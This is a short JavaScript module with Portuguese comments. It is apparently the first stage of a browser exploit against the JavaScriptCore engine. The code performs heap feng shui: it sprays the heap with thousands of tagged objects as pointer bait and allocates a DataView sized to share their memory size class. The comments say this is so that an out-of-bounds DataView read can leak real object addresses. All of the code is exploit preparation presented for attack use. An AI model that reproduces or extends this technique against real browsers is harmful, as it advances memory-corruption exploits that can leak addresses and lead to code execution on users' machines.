/**
 * MÓDULO 1: INSTANCE FACTORY (POINTER SPRAY EDITION)
 * Foco: Encher o Heap com ponteiros reais de objetos JavaScript para
 * servirem de isca quando o DataView ler fora dos limites.
 */

export const Factory = {
    buildTargets: function() {
        const instances = [];

        // =========================================================
        // HEAP FENG SHUI: A CHUVA DE PONTEIROS (Pointer Spray)
        // Em vez de Canvas (Pixels), usamos Arrays de Objetos.
        // Isso obriga o C++ a escrever endereços reais (0x00000008...) na memória.
        // =========================================================
        window.pointerBait = []; // Salvo no escopo global para o GC não apagar
        
        for (let i = 0; i < 5000; i++) {
            // Criamos um objeto genérico com um "Magic Value" para referência
            let victimObject = { magic: 0x1337BABE, id: i };
            window.pointerBait.push(victimObject);
        }

        const safeBuild = (category, name, builderFunc) => {
            try {
                let obj = builderFunc();
                if (obj) instances.push({ category, name, instance: obj });
            } catch(e) {}
        };

        // Mantemos o nosso Alvo principal: O DataView.
        // Aumentei o tamanho do buffer inicial para garantir que ele caia
        // no mesmo "bloco" de memória (Size Class) que as nossas Arrays.
        safeBuild("JSC", "DataView", () => new DataView(new ArrayBuffer(256)));

        return instances;
    }
};
